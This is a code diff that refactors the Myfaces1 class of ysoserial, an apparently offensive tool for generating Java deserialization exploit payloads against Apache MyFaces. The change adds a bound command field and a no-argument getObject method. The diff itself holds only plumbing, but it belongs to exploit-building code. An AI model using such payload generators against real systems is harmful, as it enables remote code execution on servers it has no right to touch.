@@ -15,6 +15,8 @@ import org.apache.myfaces.el.CompositeELResolver;
 import org.apache.myfaces.el.unified.FacesELContext;
 import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -42,7 +44,17 @@ import ysoserial.payloads.util.Reflections;
 @PayloadTest(skip="Requires running MyFaces, no direct execution")
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
 
-    public Object getObject ( String command ) throws Exception {
+	@Bind private String command;
+	
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public Object getObject ( ) throws Exception {
         return makeExpressionPayload(command);
     }
     
